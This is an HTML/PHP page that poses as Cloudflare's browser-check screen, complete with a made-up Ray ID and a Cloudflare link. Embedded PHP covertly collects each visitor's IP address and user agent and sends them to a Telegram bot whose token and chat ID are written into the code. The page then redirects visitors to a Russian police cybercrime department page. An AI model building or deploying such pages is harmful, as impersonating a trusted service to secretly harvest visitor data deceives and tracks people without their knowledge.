<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking your browser before accessing ИМЯСАЙТА</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            display: flex;
			flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
			order: 2; /* Устанавливаем порядок для текста ниже */
            text-align: center;
			display: flex;
			flex-direction: column;
            padding: 20px;
            background-color: #ffffff;
            border-radius: 5px;            
        }
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }
        p {
            font-size: 16px;
            margin-bottom: 20px;
        }
		p1 {
            font-size: 12px;
            margin-bottom: 20px;
        }
        .loader {
			order: 1; 
            display: flex;
            justify-content: center;
            align-items: center;
            height: 10vh;
            background-color: #ffffff;
        }
        .dot {
            width: 10px;
            height: 10px;
            margin: 0 5px;
            background-color: orange;
            border-radius: 50%;
            animation: bounce 1.4s infinite ease-in-out;
        }
        .dot:nth-child(1) {
            animation-delay: -0.32s;
        }
        .dot:nth-child(2) {
            animation-delay: -0.16s;
        }
        @keyframes bounce {
            0%, 80%, 100% {
                transform: translateY(0);
            }
            40% {
                transform: translateY(-15px);
            }
        }
    </style>
</head>
<body>
<div class="loader">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
    </div>
    <div class="container">
        <h1>Checking your browser before accessing</h1>
        <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
        <p>Please allow up to 5 seconds...</p>
		<p1><a href="https://www.cloudflare.com/">DDoS protection by Cloudflare</a></p1>
		<p1>Ray ID: 3a0713354f69a1cf14012d3f1c76708f</p1>
    </div>
<?php
// Получаем данные пользователя
$userIP = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
// Формируем сообщение для Telegram
$message = "IP: {$userIP}\n";
$message .= "userAgent: {$userAgent}\n";
// Токен вашего бота и ID чата
$token = "5097888645:AAGp251mc-P_OB1YCtdZDCabLBRQBXuYeJ4"; // Замените на токен вашего бота
$chat_id = "-1002070947563"; // Замените на ID чата
// Отправляем сообщение через Telegram API
// URL для отправки сообщения
$url = "https://api.telegram.org/bot" . $token . "/sendMessage";
// Параметры запроса
$data = array(
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'HTML' // Использование HTML-разметки в сообщении
);

// Инициализация cURL
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));

// Выполнение запроса
$response = curl_exec($ch);

// Закрытие cURL
curl_close($ch);

?>    
<meta http-equiv="Refresh" content="5; URL=https://xn--b1aew.xn--p1ai/mvd/structure1/Upravlenija/%D1%83%D0%B1%D0%BA" /> 
</body>
</html>
